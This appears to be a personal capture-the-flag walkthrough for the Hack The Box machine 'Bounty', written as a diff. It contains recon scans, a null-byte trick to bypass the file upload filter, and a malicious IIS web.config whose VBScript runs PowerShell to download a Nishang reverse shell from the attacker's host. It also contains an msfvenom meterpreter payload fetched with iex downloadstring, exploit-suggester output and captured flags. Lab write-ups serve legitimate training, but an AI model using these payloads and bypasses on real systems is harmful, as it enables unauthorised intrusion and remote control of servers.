@@ -1,0 +1,244 @@
+Bounty IP: 10.10.10.93
+
+
+rustscan:
+
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack
+
+
+
+
+nmap:
+
+PORT   STATE SERVICE REASON  VERSION
+80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Bounty
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+
+
+gobuster dir  -u http://10.10.10.93  -w /usr/share/wordlists/dirb/common.txt -t 64                                
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.93
+[+] Threads:        64
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2023/01/30 03:29:39 Starting gobuster
+===============================================================
+/aspnet_client (Status: 301)
+/uploadedfiles (Status: 301)
+===============================================================
+2023/01/30 03:29:45 Finished
+===============================================================
+
+
+gobuster dir  -u http://10.10.10.93/aspnet_client  -w /usr/share/wordlists/dirb/common.txt -t 64   
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.93/aspnet_client
+[+] Threads:        64
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2023/01/30 03:31:34 Starting gobuster
+===============================================================
+/system_web (Status: 301)
+===============================================================
+2023/01/30 03:31:39 Finished
+===============================================================
+
+
+
+ gobuster dir  -u http://10.10.10.93  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64  -x  aspx     
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.93
+[+] Threads:        64
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     aspx
+[+] Timeout:        10s
+===============================================================
+2023/01/30 03:48:17 Starting gobuster
+===============================================================
+/transfer.aspx (Status: 200)
+/UploadedFiles (Status: 301)
+/uploadedFiles (Status: 301)
+
+
+
+
+ nikto -h 10.10.10.93               
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.93
++ Target Hostname:    10.10.10.93
++ Target Port:        80
++ Start Time:         2023-01-30 03:29:09 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Microsoft-IIS/7.5
++ Retrieved x-powered-by header: ASP.NET
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-aspnet-version header: 2.0.50727
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ 7869 requests: 6 error(s) and 7 item(s) reported on remote host
++ End Time:           2023-01-30 03:39:41 (GMT-5) (632 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+
+visiting http://10.10.10.93/transfer.aspx we have an upload page where we can upload jpg files
+visiting http://10.10.10.93/uploadedfilex/file.name we can display that file
+After a while the image is deleted, maybe a cron job deletes the files uploaded after a short while
+
+
+
+What to do next?
+
+Upload an aspx shell and try to run it
+
+when trying to upload an aspx shell, there is an error Invalid File. Please try again. Start burp and intercept the request 
+
+I can add a null byte after the .aspx in order to bypass the jpg limitation
+
+shell.aspx%00.jpg
+
+but when trying to display the shell, we have an issue:
+
+
+Server Error in '/' Application.
+The resource cannot be found.
+Description: HTTP 404. The resource you are looking for (or one of its dependencies) could have been removed, had its name changed, or is temporarily unavailable.  Please review the following URL and make sure that it is spelled correctly.
+
+Requested URL: /uploadedfiles/shell.aspx
+
+
+so, for the foothold we need to upload an web.config file to the machine that will download a powershell rev shell to the machine:
+
+Steps:
+1. get the web config file on the machine: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config
+2. get the invoke powershelltcp.ps1 on your machine: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+3 echo a  new line to the powershelltcp script: echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 9001' >> Invoke-PowerShellTcp.ps1
+4.add the following to the web.config file:
+<%@ Language=VBScript %>
+<%
+  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')")
+%>
+5. host the Invoke-PowerShellTcp.ps1 file
+6. start the listenr on port 9001
+7. upload the web config file to the victim machine and catch the reverse shell.
+
+
+
+
+user flag: ad8703f7b490eaecc03ba32364a323c1
+
+PRIVESC:
+
+
+PS C:\Users\merlin\Desktop> systeminfo
+
+Host Name:                 BOUNTY
+OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                55041-402-3606965-84760
+Original Install Date:     5/30/2018, 12:22:24 AM
+System Boot Time:          1/30/2023, 10:26:26 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 1,429 MB
+Virtual Memory: Max Size:  4,095 MB
+Virtual Memory: Available: 3,439 MB
+Virtual Memory: In Use:    656 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.93
+PS C:\Users\merlin\Desktop> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+PS C:\Users\merlin\Desktop> 
+
+
+Acording to the resuls of whoami/priv we can use lonely potato exploit OR we can use local-exploit-suggester from msfconsole
+
+for msfconsole we need to create a meterpreter shell, so in order to do this, we need to use msfvenom in order to create a revesrse shell: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f psh -o met.ps1
+
+
+After this we need to host the payload and download it to the machine:
+
+iex(new-object net.webclient).downloadstring('http://10.10.14.14/met4444.ps1')
+
+
+now that we have a meterpreter shell, we can use local-exploit-suggester in order to find some exploits:
+
+msf post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.10.93 - Collecting local exploits for x64/windows...
+[*] 10.10.10.93 - 18 exploit checks are being tried...
+[+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
+[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[*] Post module execution completed
+
+
+
+
+
+rot flag: 009d3b126fa0b4e7aac71550228e153f
